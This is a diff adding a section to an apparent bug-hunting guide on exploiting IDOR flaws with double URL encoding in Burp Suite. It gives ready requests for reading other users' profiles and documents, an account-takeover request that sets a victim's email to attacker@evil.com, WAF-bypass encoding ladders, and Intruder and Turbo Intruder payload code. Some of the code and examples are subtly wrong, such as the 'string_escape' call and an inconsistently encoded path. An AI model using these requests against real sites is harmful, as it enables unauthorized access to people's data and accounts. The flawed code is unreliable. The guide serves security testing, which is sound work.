@@ -6325,3 +6325,514 @@ Rule 2: URL-encode all characters → %2531%2530%2530
 
 ---
 
+# 🎯 **Bug #12: Double URL Encoding IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**Double URL Encoding** IDOR occurs when the application decodes parameters multiple times, allowing attackers to bypass input filters or WAFs by encoding characters twice.
+
+## 🔍 **Understanding Double URL Encoding**
+
+### **How It Works**
+```
+Original:    id=100
+URL Encoded: id=%31%30%30
+Double Encoded: id=%2531%2530%2530
+```
+
+### **Why It Works**
+1. Some applications decode parameters multiple times
+2. WAFs may only check single-encoded values
+3. Server might apply URL decoding before validation AND before processing
+
+---
+
+## 🛠️ **Complete Burp Suite Methodology**
+
+### **Phase 1: Reconnaissance & Target Identification**
+
+#### **Step 1.1: Map the Application**
+1. **Spider the target** using Burp Spider
+2. **Browse manually** while Burp records traffic
+3. **Identify all parameters** that might contain IDs:
+   - `id`, `user_id`, `file_id`, `document_id`
+   - `reference`, `ref`, `uid`, `guid`
+   - `product`, `order`, `invoice`, `ticket`
+
+#### **Step 1.2: Identify Potential IDOR Points**
+Look for:
+- **Profile pages**: `/user/profile?id=100`
+- **File downloads**: `/download?file=100`
+- **API endpoints**: `/api/v1/users/100`
+- **Edit forms**: `/edit?post=50`
+- **Delete operations**: `/delete?id=200`
+
+---
+
+### **Phase 2: Burp Suite Configuration**
+
+#### **Step 2.1: Set Up Burp**
+1. **Configure browser proxy** to 127.0.0.1:8080
+2. **Install Burp CA certificate**
+3. **Enable Intercept** for initial testing
+
+#### **Step 2.2: Configure Intruder for Double Encoding**
+```
+Target: /endpoint?parameter=§original_value§
+Payload type: Custom iterator
+Payload settings:
+    Position 1: [Original characters]
+    Position 2: [URL encoding]
+    Position 3: [Double URL encoding]
+```
+
+---
+
+### **Phase 3: Manual Testing Methodology**
+
+#### **Step 3.1: Identify Base Parameter**
+```http
+GET /api/user/profile?id=100 HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+```
+
+#### **Step 3.2: Test Single URL Encoding**
+1. **Send to Repeater** (Ctrl+R)
+2. **Encode the ID**:
+   - Original: `100`
+   - URL Encoded: `%31%30%30`
+
+```http
+GET /api/user/profile?id=%31%30%30 HTTP/1.1
+Host: target.com
+```
+
+3. **Check response**:
+   - If 200 OK → Application decodes once
+   - If 403/404 → May have WAF/filter
+
+#### **Step 3.3: Test Double URL Encoding**
+1. **Double encode the % sign**:
+   - `%` → `%25`
+   - So `%31` becomes `%2531`
+
+**Process:**
+```
+Original:     100
+URL Encode:   %31%30%30
+Double Encode: %2531%2530%2530
+```
+
+**Request:**
+```http
+GET /api/user/profile?id=%2531%2530%2530 HTTP/1.1
+Host: target.com
+```
+
+#### **Step 3.4: Verify Double Decoding**
+1. If double encoded request returns 200
+2. Try accessing other user's data:
+   - Victim ID: 101
+   - Double encode: `101` → `%31%30%31` → `%2531%2530%2531`
+
+```http
+GET /api/user/profile?id=%2531%2530%2531 HTTP/1.1
+Host: target.com
+```
+
+---
+
+### **Phase 4: Burp Intruder Automation**
+
+#### **Step 4.1: Set Up Intruder Attack**
+1. **Right-click request** → Send to Intruder
+2. **Clear all payload positions** (Ctrl+A, then Ctrl+Shift+Del)
+3. **Add position marker** around the numeric ID:
+   ```
+   GET /api/user/profile?id=§100§
+   ```
+
+#### **Step 4.2: Configure Payloads**
+
+**Payload Type: Custom Iterator**
+
+**Payload Set 1 (Digits 0-9):**
+```
+0,1,2,3,4,5,6,7,8,9
+```
+
+**Payload Set 2 (URL Encoding for digits):**
+```
+%30 = 0
+%31 = 1
+%32 = 2
+%33 = 3
+%34 = 4
+%35 = 5
+%36 = 6
+%37 = 7
+%38 = 8
+%39 = 9
+```
+
+**Payload Set 3 (Double URL Encoding):**
+```
+%2530 = %30 = 0
+%2531 = %31 = 1
+%2532 = %32 = 2
+%2533 = %33 = 3
+%2534 = %34 = 4
+%2535 = %35 = 5
+%2536 = %36 = 6
+%2537 = %37 = 7
+%2538 = %38 = 8
+%2539 = %39 = 9
+```
+
+#### **Step 4.3: Configure Attack Settings**
+1. **Resource Pool**: Create new pool with 1 thread (avoid rate limiting)
+2. **Attack Type**: Sniper (for testing each encoding separately)
+
+---
+
+### **Phase 5: Advanced Intruder Configuration**
+
+#### **Step 5.1: Payload Processing Rules**
+Add these processing rules:
+1. **Add prefix**: `%` (for single encoding)
+2. **Add prefix**: `%25` (for double encoding)
+3. **URL encode key characters**
+
+#### **Step 5.2: Grep - Match**
+Configure response matching:
+- Add "Unauthorized" (to identify blocks)
+- Add "Access Denied"
+- Add "404 Not Found"
+- Add specific user data patterns
+
+#### **Step 5.3: Attack Types for Different Scenarios**
+
+**Sniper Attack** (single payload position):
+```
+Payload: 100, 101, %31%30%30, %2531%2530%2530
+```
+
+**Battering Ram** (same payload in all positions):
+```
+Payload: 100
+Position1: %31%30%30
+Position2: %2531%2530%2530
+```
+
+**Pitchfork** (multiple payload sets):
+```
+Set1: 100, 101, 102 (original)
+Set2: %31%30%30, %31%30%31, %31%30%32 (encoded)
+Set3: %2531%2530%2530, %2531%2530%2531, %2531%2530%2532 (double)
+```
+
+---
+
+### **Phase 6: Burp Suite Extensions**
+
+#### **Step 6.1: Recommended Extensions**
+
+1. **Turbo Intruder** - For high-speed attacks
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=5,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    
+    for word in wordlists:
+        # Generate double encoded payload
+        encoded = word.encode('string_escape')
+        double_encoded = encoded.replace('%', '%25')
+        engine.queue(target.req, double_encoded)
+```
+
+2. **Encoder** - Built-in encoding/decoding
+   - Use **Decoder** tab for quick encoding
+   - Convert: Plain → URL → URL again
+
+3. **Param Miner** - Find hidden parameters
+   - Right-click → Extensions → Param Miner
+   - Check "Discover parameters with invalid values"
+
+4. **Backslash Powered Scanner** - Detect decoding quirks
+
+---
+
+### **Phase 7: Automated Scanning with Active Scanner**
+
+#### **Step 7.1: Configure Active Scan**
+1. **Right-click request** → Do an active scan
+2. **Scan configuration** → Customize:
+   - Enable "Insertion point types" → All
+   - Add custom payloads for double encoding
+
+#### **Step 7.2: Insert Custom Payloads**
+Add to **Payloads** list:
+```
+%2531%2530%2530
+%2561%2564%256d%2569%256e
+%2572%256f%256f%2574
+%2568%2574%2574%2570%253a%252f%252f
+```
+
+---
+
+### **Phase 8: Manual Exploitation Techniques**
+
+#### **Step 8.1: Burp Repeater Manual Testing**
+
+**Test Case 1: Numeric ID**
+```
+Original: /user/100
+Test: /user/%2531%2530%2530
+Test: /user/%25%33%31%25%33%30%25%33%30 (partial encoding)
+```
+
+**Test Case 2: Alphanumeric IDs**
+```
+Original: doc=ABC123
+URL Encoded: doc=%41%42%43%31%32%33
+Double Encoded: doc=%2541%2542%2543%2531%2532%2533
+```
+
+**Test Case 3: Path-based IDs**
+```
+Original: /files/report_2024.pdf
+URL Encoded: /files/report_%32%30%32%34.pdf
+Double Encoded: /files/report_%2532%2530%2532%34.pdf
+```
+
+#### **Step 8.2: Testing Different HTTP Methods**
+```http
+# GET request
+GET /api/user/%2531%2530%2531 HTTP/1.1
+
+# POST with encoded parameter
+POST /api/user HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+id=%2531%2530%2531
+
+# JSON with double encoded value
+POST /api/user HTTP/1.1
+Content-Type: application/json
+
+{"id": "%2531%2530%2531"}
+```
+
+---
+
+### **Phase 9: Bypassing WAFs with Double Encoding**
+
+#### **Step 9.1: Progressive Encoding**
+Try these variations:
+```
+Level 1: %31%30%31
+Level 2: %2531%2530%2531
+Level 3: %252531%252530%252531
+Level 4: %25252531%25252530%25252531
+```
+
+#### **Step 9.2: Mixed Encoding**
+```
+Original: 101
+Mixed: %2531%30%2531
+Mixed: %31%2530%31
+Mixed: %25%33%31%30%25%33%31
+```
+
+#### **Step 9.3: Case Variation**
+```
+Standard: %2531%2530%2531
+Uppercase: %2531%2530%2531 (same)
+Mixed case: %25%33%31%25%33%30%25%33%31
+```
+
+---
+
+### **Phase 10: Exploitation Chain**
+
+#### **Step 10.1: Identify User ID Pattern**
+1. Create 2 accounts: UserA, UserB
+2. Note UserA ID: 10001
+3. Note UserB ID: 10002
+4. Test double encoding for UserB from UserA session
+
+#### **Step 10.2: Escalate Impact**
+
+**Profile Data Access:**
+```http
+GET /api/user/profile?id=%2531%2530%2530%2530%2532 HTTP/1.1
+```
+
+**Sensitive Documents:**
+```http
+GET /api/documents?user_id=%2531%2530%2530%2530%2532 HTTP/1.1
+```
+
+**Account Settings:**
+```http
+POST /api/user/update HTTP/1.1
+Content-Type: application/json
+
+{
+  "user_id": "%2531%2530%2530%2530%2532",
+  "email": "attacker@evil.com"
+}
+```
+
+---
+
+### **Phase 11: Detection & Validation**
+
+#### **Step 11.1: Response Analysis in Burp**
+
+**Successful exploitation indicators:**
+- **200 OK** with other user's data
+- **302 Redirect** to authenticated area
+- **Content-Length** different from unauthorized response
+- **Response time** different (timing attack)
+
+**Failed exploitation indicators:**
+- **403 Forbidden** (WAF blocked)
+- **404 Not Found** (ID invalid)
+- **302 to Login** (session invalid)
+- Custom error messages
+
+#### **Step 11.2: Use Comparer Tool**
+1. Send two responses to Comparer
+2. Compare:
+   - Legitimate access to own data
+   - Attempted access to victim data
+3. Look for identical responses (success)
+
+---
+
+### **Phase 12: Reporting Template**
+
+```markdown
+## IDOR via Double URL Encoding
+
+**Vulnerability:** Insecure Direct Object Reference
+**Technique:** Double URL Encoding Bypass
+**Endpoint:** /api/user/profile
+**Parameter:** id
+
+### Steps to Reproduce:
+1. Login as user `attacker` (ID: 100)
+2. Capture request to `/api/user/profile?id=100`
+3. Double encode victim ID `101` to `%2531%2530%2531`
+4. Send request: `GET /api/user/profile?id=%2531%2530%2531`
+5. Observe successful retrieval of victim's profile
+
+### Impact:
+- Unauthorized access to other users' personal data
+- Potential for account takeover
+- Data breach of sensitive information
+
+### Proof of Concept:
+[Burp Request/Response screenshot]
+
+### Remediation:
+- Implement proper access controls server-side
+- Apply URL decoding only once at the application level
+- Use indirect reference maps (UUIDs instead of sequential IDs)
+- Validate user permissions for every request
+
+### CVSS Score: 7.5 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+```
+
+---
+
+## 🎯 **Pro Tips**
+
+### **Tip 1: Burp Macros for Double Encoding**
+Create a macro that automatically double encodes:
+1. **Project options** → **Sessions** → **Macros**
+2. Add macro to encode selected parameter
+3. Apply to all outgoing requests
+
+### **Tip 2: Session Handling Rules**
+Create rule to handle tokens after double encoding:
+1. **Session Handling Rules** → **Add**
+2. Rule: "Update Cookie with latest value"
+3. Scope: All tools
+
+### **Tip 3: Custom Payload Generator**
+Use **Extension** (Python) to generate double encoded payloads:
+```python
+from burp import IBurpExtender, IIntruderPayloadGeneratorFactory
+import urllib
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        
+    def createNewInstance(self, attack):
+        return DoubleEncodeGenerator()
+    
+class DoubleEncodeGenerator:
+    def getNextPayload(self, base_value):
+        # Double encode the payload
+        once = urllib.quote(base_value)
+        twice = urllib.quote(once)
+        return twice
+```
+
+---
+
+## 📊 **Testing Checklist**
+
+- [ ] Identify all ID parameters
+- [ ] Test single URL encoding
+- [ ] Test double URL encoding
+- [ ] Test progressive encoding (3+ levels)
+- [ ] Test mixed encoding levels
+- [ ] Test different parameter locations
+- [ ] Test different HTTP methods
+- [ ] Document all successful bypasses
+- [ ] Verify impact with multiple victims
+- [ ] Create proof of concept
+- [ ] Write detailed report
+
+---
+
+## ⚠️ **Important Considerations**
+
+### **Legal & Ethical**
+- Only test on authorized targets
+- Stop if you encounter PII
+- Report findings responsibly
+- Don't exfiltrate data
+
+### **Technical Limitations**
+- Rate limiting may block attacks
+- WAF may detect encoding patterns
+- Some apps normalize input
+- Logging may reveal your tests
+
+### **When It Works Best**
+- Legacy applications
+- Custom frameworks
+- Multiple decoding layers
+- Weak input validation
+- Missing WAF rules
+
+---
+
+## 🎓 **Practice on These Labs**
+1. PortSwigger: "IDOR with double encoding"
+2. PentesterLab: "Encoding IDOR"
+3. OWASP WebGoat: "Insecure Direct Object References"
+4. HackTheBox: "Encoding" machine
+
+---
+
